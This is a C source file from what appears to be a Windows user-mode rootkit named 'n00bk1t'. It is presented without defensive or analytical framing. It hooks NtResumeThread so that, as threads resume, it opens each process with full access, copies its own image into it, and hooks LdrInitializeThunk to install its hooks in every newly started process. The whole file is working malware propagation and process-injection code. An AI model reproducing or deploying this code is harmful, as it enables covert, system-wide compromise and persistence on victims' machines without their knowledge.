#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "engine.h"
#include "misc.h"
#include "randoma.h"
#include "n00bk1t.h"

#include "ntresumethread.h"

extern HMODULE n00bk1tBaseAddress;
extern DWORD JMP_TABLE_SIZE;

NTSTATUS WINAPI NewLdrInitializeThunk(
		DWORD Unknown1,
		DWORD Unknown2,
		DWORD Unknown3
)
{
	NTSTATUS rc;

	// call original function
	rc=OldLdrInitializeThunk(Unknown1,Unknown2,Unknown3);

	// hook process
	n00bk1t_HookCurrentProcess();

	// unhook LdrInitializeThunk
	engine_UnHookFunctionInProcess(NtCurrentProcess(),"NTDLL.DLL","LdrInitializeThunk",OldLdrInitializeThunk,dwLdrInitializeThunkSize);

	return rc;
}
// ntdll.NtResumeThread
NTSTATUS WINAPI NewNtResumeThread(HANDLE hThread,PDWORD SuspendCount)
{
	DWORD dwPid;
	LPVOID lpFunction;
	OBJECT_ATTRIBUTES oa={sizeof(oa)};
	CLIENT_ID ci;
	HANDLE hProcess;
	DWORD dwFunctionSize;
	int iRnd;
	
	dwPid=misc_GetPidByThread(hThread);
	if (dwPid!=0)
	{
		// write myself to pid & hook ldrinitializethunk;
		ci.UniqueProcess=(HANDLE)dwPid;
		ci.UniqueThread=0;

		// open remote process
		if (NT_SUCCESS(NtOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oa,&ci)))
		{
			if (engine_CopyImageToProcess(hProcess,n00bk1tBaseAddress))
			{
				// clean remote hooktable
				n00bk1t_CleanRemoteHookTable(hProcess);

				// randomize baby !
				iRnd=XIRandom(0,JMP_TABLE_SIZE);

				// hook ldrinitializethunk in remote process
				lpFunction=engine_HookFunctionInProcess(hProcess,"NTDLL.DLL","LdrInitializeThunk",NewLdrInitializeThunk,&dwFunctionSize,NULL,iRnd);
				if (lpFunction)
				{
					// save address of original function in process
					engine_SaveRemoteVar(hProcess,&OldLdrInitializeThunk,&lpFunction);
					// save size of original function 
					engine_SaveRemoteVar(hProcess,&dwLdrInitializeThunkSize,&dwFunctionSize);
				}
			}
			
			// close handle
			NtClose(hProcess);
		}
	}
	
	// call original function
	return OldNtResumeThread(hThread,SuspendCount);
}